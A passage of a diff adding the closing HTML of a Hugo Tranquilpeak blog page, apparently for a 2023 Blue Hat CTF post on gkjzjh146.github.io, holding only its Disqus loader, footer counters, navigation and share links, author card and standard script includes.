+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        var disqus_shortname = 'hugo-tranquilpeak-theme';
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+    </script>
+  
+
+
+          </div>
+        </article>
+        <footer id="footer" class="main-content-wrap">
+  <span class="copyrights">
+    &copy; 2023 gkjzjh146. All Rights Reserved
+  </span>
+    <br>
+    
+    <div class="busuanzi-footer">
+  <span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+  </span>
+        <span id="busuanzi_container_site_uv">
+    本站访客数<span id="busuanzi_value_site_uv"></span>人次
+  </span>
+    </div></footer>
+
+      </div>
+      <div id="bottom-bar" class="post-bottom-bar" data-behavior="4">
+        
+<div class="post-actions-wrap">
+  <nav >
+    <ul class="post-actions post-action-nav">
+      
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--disabled">
+          
+              <i class="fa fa-angle-left"></i>
+              <span class="hide-xs hide-sm text-small icon-ml">下一篇</span>
+            </a>
+        </li>
+        <li class="post-action">
+          
+            <a class="post-action-btn btn btn--default tooltip--top" href="https://gkjzjh146.github.io/post/2023%E9%99%87%E5%89%91%E6%9D%AF/" data-tooltip="【2023陇剑杯】WP" aria-label="上一篇: 【2023陇剑杯】WP">
+          
+              <span class="hide-xs hide-sm text-small icon-mr">上一篇</span>
+              <i class="fa fa-angle-right"></i>
+            </a>
+        </li>
+      
+    </ul>
+  </nav>
+<ul class="post-actions post-action-share" >
+  
+    <li class="post-action hide-lg hide-md hide-sm">
+      <a class="post-action-btn btn btn--default btn-open-shareoptions" href="#btn-open-shareoptions" aria-label="分享这个帖子">
+        <i class="fa fa-share-alt" aria-hidden="true"></i>
+      </a>
+    </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Facebook" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://twitter.com/intent/tweet?text=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Twitter" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+      <li class="post-action hide-xs">
+        <a class="post-action-btn btn btn--default" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https://gkjzjh146.github.io/post/2023%E8%93%9D%E5%B8%BDctf/" title="分享到 Linkedin" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i>
+        </a>
+      </li>
+    
+  
+  
+    <li class="post-action">
+      <a class="post-action-btn btn btn--default" href="#disqus_thread" aria-label="发表评论">
+        <i class="far fa-comment"></i>
+      </a>
+    </li>
+  
+  <li class="post-action">
+    
+      <a class="post-action-btn btn btn--default" href="#top" aria-label="回到顶部">
+      <i class="fa fa-arrow-up" aria-hidden="true"></i>
+    
+    </a>
+  </li>
+</ul>
+</div>
+
+
+      </div>
+      
+<div id="share-options-bar" class="share-options-bar" data-behavior="4">
+  <i id="btn-close-shareoptions" class="fa fa-times"></i>
+  <ul class="share-options">
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023%25E8%2593%259D%25E5%25B8%25BDctf%2F" aria-label="分享到 Facebook">
+          <i class="fab fa-facebook-square" aria-hidden="true"></i><span>分享到 Facebook</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023%25E8%2593%259D%25E5%25B8%25BDctf%2F" aria-label="分享到 Twitter">
+          <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+        </a>
+      </li>
+    
+      <li class="share-option">
+        <a class="share-option-btn" target="new" href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fgkjzjh146.github.io%2Fpost%2F2023%25E8%2593%259D%25E5%25B8%25BDctf%2F" aria-label="分享到 Linkedin">
+          <i class="fab fa-linkedin" aria-hidden="true"></i><span>分享到 Linkedin</span>
+        </a>
+      </li>
+    
+  </ul>
+</div>
+<div id="share-options-mask" class="share-options-mask"></div>
+
+
+    </div>
+    
+    <div id="about">
+  <div id="about-card">
+    <div id="about-btn-close">
+      <i class="fa fa-times"></i>
+    </div>
+    
+      <img id="about-card-picture" src="https://gkjzjh146.github.io/images/1.jpg" alt="作者的图片" />
+    
+    <h4 id="about-card-name">gkjzjh146</h4>
+    
+      <div id="about-card-bio">会点web，会点misc</div>
+    
+    
+    
+  </div>
+</div>
+
+    
+
+    
+  
+    
+      <div id="cover" style="background-image:url('https://gkjzjh146.github.io/images/3.jpeg');"></div>
+    
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/highlight.min.js" integrity="sha512-z+/WWfyD5tccCukM4VvONpEtLmbAm5LDu7eKiyMQJ9m7OfPEDL7gENyDRL3Yfe8XAuGsS2fS4xSMnl6d30kqGQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha512-uURl+ZXMBrF4AwGaWmEetzrd+J5/8NRkWAvJx5sbPSSuOb0bZLqf+tOzniObO00BjHa/dD7gub9oCGMLPQHtQA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+
+<script src="https://gkjzjh146.github.io/js/script-yqzy9wdlzix4lbbwdnzvwx3egsne77earqmn73v9uno8aupuph8wfguccut.min.js"></script>
+
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-gE8KAQyFIzV1C9+GZ8TKJHZS2s+n7EjNtC+IMRn1l5+WYJTHOODUM6JSjZhFhqXmc7bG8Av6XXpckA4tYhflnw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/apache.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-EWROca+bote+7Oaaar1F6y74iZj1r1F9rm/ly7o+/FwJopbBaWtsFDmaKoZDd3QiGU2pGacBirHJNivmGLYrow==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/go.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-GDVzAn0wpx1yVtQsRWmFc6PhJiLBPdUic+h4GWgljBh904O3JU10fk9EKNpVyIoPqkFn54rgL2QBG4BmUTMpiQ==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/http.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-UgZlma8NzkrDb/NWgmLIcTrH7i/CSnLLDRFqCSNF5NGPpjKmzyM25qcoXGOup8+cDakKyaiTDd7N4dyH4YT+IA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/less.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-lot9koe73sfXIrUvIPM/UEhuMciN56RPyBdOyZgfO53P2lkWyyXN7J+njcxIIBRV+nVDQeiWtiXg+bLAJZDTfg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/nginx.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-Zd3e7XxHP00TD0Imr0PIfeM0fl0v95kMWuhyAS3Wn1UTSXTkz0OhtRgBAr4JlmADRgiXr4x7lpeUdqaGN8xIog==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/puppet.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-qtqDO052iXMSP+5d/aE/jMtL9vIIGvONgTJziC2K/ZIB1yEGa55WVxGE9/08rSQ62EoDifS9SWVGZ7ihSLhzMA==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/scss.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-1NmkjnEDnwwwcu28KoQF8vs3oaPFokQHbmbtwGhFfeDsQZtVFI8zW2aE9O8yMYdpdyKV/5blE4pSWw4Z/Sv97w==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/stylus.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-B2wSfruPjr8EJL6IIzQr1eAuDwrsfIfccNf/LCEdxELCgC/S/ZMt/Uvk80aD79m7IqOqW+Sw8nbkvha20yZpzg==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/swift.min.js"></script>
+  
+
+  
+    <script async crossorigin="anonymous" defer integrity="sha512-28oDiQZGKUVN6wQ7PSLPNipOcmkCALXKwOi7bnkyFf8QiMZQxG9EQoy/iiNx6Zxj2cG2SbVa4dXKigQhu7GiFw==" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.1.0/languages/yaml.min.js"></script>
+  
+
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+
+
+    
+  </body>
+</html>
+
